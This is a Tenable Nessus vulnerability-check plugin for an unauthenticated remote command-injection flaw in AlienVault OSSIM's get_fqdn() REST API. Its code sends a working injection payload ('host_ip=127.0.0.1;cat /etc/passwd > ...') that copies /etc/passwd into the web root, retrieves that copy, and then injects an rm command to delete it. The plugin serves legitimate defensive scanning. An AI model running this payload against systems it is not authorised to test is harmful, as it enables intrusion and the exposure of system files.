#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(100381);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2017/05/25 13:29:26 $");

  script_osvdb_id(156312);
  script_xref(name:"EDB-ID", value:"41884");

  script_name(english:"AlienVault OSSIM get_fqdn() RCE");
  script_summary(english:"Attempts to run commands remotely.");

  script_set_attribute(attribute:"synopsis", value:
"A security suite application hosted on the remote web server is
affected by a remote command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of AlienVault Open Source Security Information Management
(OSSIM) running on the remote host is affected by a flaw in the
get_fqdn() API function due to improper sanitization of user-supplied
input. An unauthenticated, remote attacker can exploit this to execute
arbitrary commands.");
  # https://www.alienvault.com/forums/discussion/8415/alienvault-v5-3-6-hotfix-important-update
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?68f11f0c");
  script_set_attribute(attribute:"see_also", value:"https://blogs.securiteam.com/index.php/archives/3085");
  script_set_attribute(attribute:"solution", value:
"Upgrade to AlienVault OSSIM version 5.3.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/02/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/02/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/05/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:alienvault:open_source_security_information_management");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("ossim_web_detect.nasl", "ossim_rest_api_detect.nbin");
  script_require_keys("installed_sw/ossim", "Services/AlienVault OSSIM REST API");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app_name = "AlienVault OSSIM REST API";
rest_port = get_service(svc:app_name, exit_on_fail:TRUE);

# OSSIM front end can register on multiple ports
# We only need to check one
installs = get_combined_installs(app_name:"ossim", exit_if_not_found:TRUE);
install = installs[1][0];

# Initial exploit
data = "host_ip=127.0.0.1;cat /etc/passwd > /usr/share/ossim/www/passwd.js";

res = http_send_recv3(
  method       : 'POST',
  item         : '/av/api/1.0/system/local/network/fqdn',
  port         : rest_port,
  add_headers  : make_array('Accept', 'application/json'),
  content_type : 'application/x-www-form-urlencoded',
  data : data
);

if (empty_or_null(res)) audit(AUDIT_RESP_NOT, rest_port, "exploit POST request");
if ("200 OK" >!< res[0]) audit(AUDIT_HOST_NOT, "affected");

# Check to see if it worked, by looking at web interface
res = http_send_recv3(
  method : 'GET',
  item : '/ossim/passwd.js',
  port: install['port']
);

if (empty_or_null(res)) audit(AUDIT_RESP_NOT, install["port"], "verification GET request");
if ("200 OK" >!< res[0]) audit(AUDIT_HOST_NOT, "affected");

if (pgrep(string:res[2], pattern:"root:.*:0:[01]:"))
{
  report = '\nNessus was able to retrieve the contents of /etc/passwd: ' +
    '\n\n' + res[2];

  # Clean up
  data = "host_ip=127.0.0.1;rm /usr/share/ossim/www/passwd.js";
  res = http_send_recv3(
    method       : 'POST',
    item         : '/av/api/1.0/system/local/network/fqdn',
    port         : rest_port,
    add_headers  : make_array('Accept', 'application/json'),
    content_type : 'application/x-www-form-urlencoded',
    data : data
  );

  if (empty_or_null(res) || "200 OK" >!< res[0])
  {
    report += '\n  Note: Nessus may not have deleted /usr/share/ossim/www/passwd.js';
  }

  security_report_v4(port:rest_port, extra:report, severity:SECURITY_HOLE);
}
else audit(AUDIT_HOST_NOT, "affected");
